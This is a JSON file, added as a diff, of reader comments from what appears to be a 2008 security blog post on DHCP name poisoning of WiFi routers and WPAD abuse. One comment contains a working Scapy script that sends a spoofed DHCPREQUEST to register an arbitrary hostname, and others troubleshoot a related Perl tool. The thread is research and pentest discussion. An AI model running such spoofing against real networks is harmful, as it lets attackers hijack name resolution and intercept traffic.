@@ -1,0 +1,98 @@
+[
+  {
+    "author": "Arthur",
+    "avatar": "fe6c6944900db42c25db590497ccd323",
+    "date": "2008-01-25T15:10:15.000Z",
+    "content": "This is pretty similar to the idea of dns posioning or wins poisioning leading to fun with names such as wpad.\r\n\r\nhttp://www.robertjbrown.com/2006/08/wpad_windows_proxy_auto_detect.html"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2008-01-25T15:16:12.000Z",
+    "content": "Arthur, precisely! The only difference here is that the attacker does not have to do anything fancy like poisoning the cache of a DNS server or messing with installing a secondary DHCP on a local network which will only work for clients that renew/release their IP addresses.\r\n\r\n<div class=\"message\">The attack will work flawlessly by simply registering the <strong>wpad</strong> domain.</div>"
+  },
+  {
+    "author": "Wladimir Palant",
+    "avatar": "7806629160a492b05d21fd738953a4cf",
+    "date": "2008-01-25T15:18:56.000Z",
+    "content": "While that approach is interesting of course, the attacker is way more likely to send a fake DHCP response - that will allow him to specify his own DNS server. If he manages to respond faster than the real DHCP server, he will take control of all the name resolution and not just one name. That's a common problem on networks, people installing Linux that comes pre-configured with a DHCP server service - they manage to take down the network (or at least some machines) without even noticing."
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2008-01-25T15:27:27.000Z",
+    "content": "Wladimir, yes. You are right. <strong>However, I believe that this type of attack is less severe.</strong> Here is why:\r\n\r\n<ol>\r\n<li>You have to host your own DHCP server which means that you need to dedicate your own resources.</li>\r\n<li>You need to respond quicker which is not usually a problem but still...</li>\r\n<li>You need to host your own DNS which again is a problem.</li>\r\n<li>You will affect only clients that renew/release their IPs. Although, I think you might be able to force the client to change their IP in some conditions.</li>\r\n</ol>\r\n\r\nThe DHCP Name Poisoning Attack is a lot stealthier. Once the domain is cached it will stay there for usually 5 days, depending how the attacked DHCP and DNS services are configured. Sometimes you can map names to external IP ranges. You don't need dedicated DHCP server for that. You don't have to host your own DNS. You don't have to be quicker. And you don't have to wait.\r\n\r\n<div class=\"message\">All the attackers need to do, is to poison the DHCP/DNS services. This can be achieved with a single UDP packet as described above.</div>"
+  },
+  {
+    "author": "dude",
+    "avatar": "a87b177d63e2d6be127300598eb441d8",
+    "date": "2008-01-25T19:38:07.000Z",
+    "content": "\"Many networks/routers will happily take that name and use it as part of their DNS service,\"\r\n\r\nI'm not so sure that this assumption is as widespread as it may seem.  Do yo have any data or perhaps just sample data points from your personal experience with this?"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2008-01-25T19:43:31.000Z",
+    "content": "this assumption is based entirely on my personal experience. but it sort of observed on setups where a single box handles the DHCP and the DNS traffic. This kind of setup is very typical for various devices most of which are in fact WiFi routers. This is the reason why I mentioned WiFi, exclusively, in the title of this post."
+  },
+  {
+    "author": "ikkuhqhp",
+    "avatar": "0167f880df81b3301d51444696d8728c",
+    "date": "2008-01-26T21:35:57.000Z",
+    "content": "How is the tool used? It complains code 61 (=DHO_DHCP_CLIENT_IDENTIFIER) Neither of 01:23:45:67:89:ab and 01-23-45-67-89-ab work."
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2008-01-26T21:40:20.000Z",
+    "content": "DHO_DHCP_CLIENT_IDENTIFIER is a bug in the Net::DHCP library. The MAC address format is without dashes and semicolons: 0123456789ab"
+  },
+  {
+    "author": "bb",
+    "avatar": "ef83d5b908c31aa26acc5cdb0956a1bf",
+    "date": "2008-01-28T22:49:06.000Z",
+    "content": "Same error code to me (61), even using the MAC address format without dashes and semicolons.\r\n\r\nI'm using Net::DHCP 0.66v."
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2008-01-29T08:53:13.000Z",
+    "content": "bb, it is not an error. It is a warning. You can happily ignore it or you can patch the DHO_DHCP_CLIENT_IDENTIFIER variable at the top of the script."
+  },
+  {
+    "author": "Jason Macpherson",
+    "avatar": "e84708d25a0040efb2469dac1e9cecc3",
+    "date": "2008-01-29T18:00:01.000Z",
+    "content": "I'm also getting error 61.  Tried many different mac address formats with no success.\r\n\r\n<strong>\"addOptionValue: unknown format for code (61) at t.pl line 15\"</strong>\r\n\r\nSo I coded up my own version of your tool using Scapy.\r\n\r\n<pre><code>#!/usr/bin/env python\r\n\r\nfrom scapy import *\r\n\r\ndef usage():\r\n   print \"Usage: DHCPspoof  &lt;ip&gt; &lt;name&gt;\"\r\n   sys.exit(1)\r\n\r\nif len(sys.argv) != 3:\r\n   usage()\r\n\r\nrequested_ip = sys.argv[1]\r\nrequested_name = sys.argv[2]\r\n\r\ninterface = conf.route.route(requested_ip)[0]\r\nlocalmac = get_if_hwaddr(interface)\r\nlocalip = get_if_addr(interface)\r\n\r\nprint(\"Sending DHCPREQUEST\")\r\n\r\nether = Ether(src=\"00:00:00:00:00:00\", dst=\"ff:ff:ff:ff:ff:ff\")\r\nip = IP(src=\"0.0.0.0\", dst=\"255.255.255.255\")\r\nudp = UDP(sport=68, dport=67)\r\nbootp = BOOTP(chaddr=localmac, xid=0x11033000)\r\ndhcpOptions = DHCP(options=[('message-type', 'request'), ('hostname', requested_name), ('requested_addr', requested_ip), ('end')])\r\n\r\npacket = ether/ip/udp/bootp/dhcpOptions\r\nsendp(packet)</pre></pre>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2008-01-29T18:10:52.000Z",
+    "content": "Jason, this is awesome. Wasn't aware that scapy supports BOOTP. Ok, ok, I will test your version to see how it works. 10x."
+  },
+  {
+    "author": "bb",
+    "avatar": "ef83d5b908c31aa26acc5cdb0956a1bf",
+    "date": "2008-01-30T03:46:08.000Z",
+    "content": "No success with the first script.\r\n\r\nI guess that i'm meant to use scapy :P It was presented to me a couple of months ago because of a work for college and since then it appeared to me as a very useful tool on a situation or another.\r\n\r\nAnyway, tks Jason, it works fine to me."
+  },
+  {
+    "author": "Shoaib Yousuf",
+    "avatar": "af275b336b54b308c86ba4c164bf3b89",
+    "date": "2008-01-30T05:37:18.000Z",
+    "content": "pdp,\r\n\r\nVery good and interesting post. Excellent researched and well explained.\r\n\r\nI don't think so we will see this type of attack vectors in wild for quite some time.\r\n\r\nBut you never know. Definitely by knowing this we are ahead of bad guys though.\r\n\r\nCheers\r\nShoaib"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2008-01-30T08:55:10.000Z",
+    "content": "bb, Jason's script is nice and simple but I cannot make it work on windows with scapy. Hmmm...\r\n\r\nShoaib, yes of course, and I doubt that you will see these kind of stuff in some massive attack outbreaks. Though, it is a technique to keep in mind when you do pentest/security audit."
+  },
+  {
+    "author": "Ben",
+    "avatar": "2a32a9448c8484e29522a01854838fec",
+    "date": "2008-02-06T16:28:03.000Z",
+    "content": "What is the usage of the 2nd script?\r\n\r\npython test.py DHCPspoof (then what?)\r\n\r\nThanks"
+  }
+]
